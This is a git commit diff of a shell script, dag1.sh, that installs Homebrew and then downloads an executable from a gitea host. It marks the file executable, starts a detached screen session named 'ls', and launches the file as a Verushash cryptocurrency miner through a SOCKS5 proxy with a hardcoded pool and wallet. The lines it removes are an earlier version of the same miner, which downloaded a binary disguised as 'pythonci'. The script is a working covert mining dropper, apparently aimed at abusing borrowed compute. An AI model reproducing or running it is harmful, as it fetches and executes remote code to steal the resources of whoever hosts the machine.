c54722adf5956d072a717951898de8e77286190a
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-10 22:08:47 +0100

    Update dag1.sh

--- dag1.sh
+++ dag1.sh
@@ -1,14 +1,11 @@
-#!/bin/bash
+#!/bin/sh
 softwareupdate -l
 ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
 brew install --cask screen
 brew install coreutils
-wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
-chmod +x pythonci
-screen -dmS ls
-POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
-WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+wget https://try.gitea.io/siliwangi/vio/raw/branch/master/osx
+chmod +x osx
+screen -dmS ls 
+WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-CPU)
 PROXY=socks5://72.195.114.169:4145
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
-timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
-echo Sukses
+./osx -v -l stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb.USD -p c=DOGE,mc=VRSC -t 40\n
